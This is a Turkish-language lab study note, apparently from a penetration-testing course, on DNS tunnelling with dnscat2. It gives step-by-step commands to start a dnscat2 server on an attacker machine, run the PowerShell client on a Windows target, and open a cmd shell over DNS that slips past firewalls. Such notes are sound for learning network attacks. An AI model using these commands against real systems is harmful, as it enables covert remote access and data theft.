Bu, port yönlendirmelerden sonra gelen en eğlenceli ve en gizemli konulardan biri: **DNS Tünelleme (Dnscat2)**. 

Mantık yine A-B-C ama bu sefer kurduğumuz tünelin içinden normal veri değil, **DNS paketleri** geçiyor. Neden? Çünkü şirketler güvenlik duvarlarında (Firewall) 80, 443 veya 22 gibi portları kapatabilir ama DNS (53) portu internete çıkmak zorunda olduğu için genellikle açıktır. Biz de veriyi DNS paketlerinin içine saklayarak dışarı sızdırıyoruz.

Yine A-B-C mantığıyla notlarını çıkarıyorum:

**Makineler:**
*   **A (Saldırgan):** Senin makinen (10.10.15.12)
*   **B (Hedef/Windows):** Tünelin istemcisini çalıştırdığımız makine.
*   **C:** (Bu senaryoda yok, doğrudan B'ye shell alıyoruz).

---

### Adım Adım Notların (Kodlar)

**1. Adım: Sunucuyu (A Makinesi) İndir ve Kur**
A makinesinde Dnscat2 sunucusunu klonla ve gerekli Ruby kütüphanelerini kur:
```bash
cd /opt
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

**2. Adım: Sunucuyu Başlat (A Makinesi)**
Kendi VPN IP'ni (`10.10.15.12`) ve sahte bir alan adını (`inlanefreight.local`) kullanarak dinleyiciyi başlat:
```bash
sudo ruby dnscat2.rb --dns host=10.10.15.12,port=53,domain=inlanefreight.local --no-cache
```
*(Ekranda sana bir **Secret Key** (Gizli Anahtar) verecek. Örneğin: `dec84a1c...`. Bunu kopyala, birazdan lazım olacak.)*

**3. Adım: İstemciyi Hazırla (A Makinesi)**
Windows hedefe atacağımız PowerShell versiyonunu indir:
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

**4. Adım: Hedefe Bağlan (B Makinesi / Windows)**
`dnscat2-powershell` klasörünü hedef makineye at (SMB, HTTP sunucusu vs. ile) ve PowerShell'i aç:
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer 10.10.15.12 -Domain inlanefreight.local -PreSharedSecret <BURAYA_2.ADIMDAKI_ANAHTARI_YAZ> -Exec cmd
```

**5. Adım: Oturuma Gir (A Makinesi)**
C'den (yani hedeften) bağlantı düştüğünde A makinesindeki Dnscat2 konsolunda `Session 1 SECURED` yazısını göreceksin. Şu komutla o oturuma bağlan:
```text
window -i 1
```
*(Artık karşı makinenin CMD'sine düşmüş olacaksın).*

---
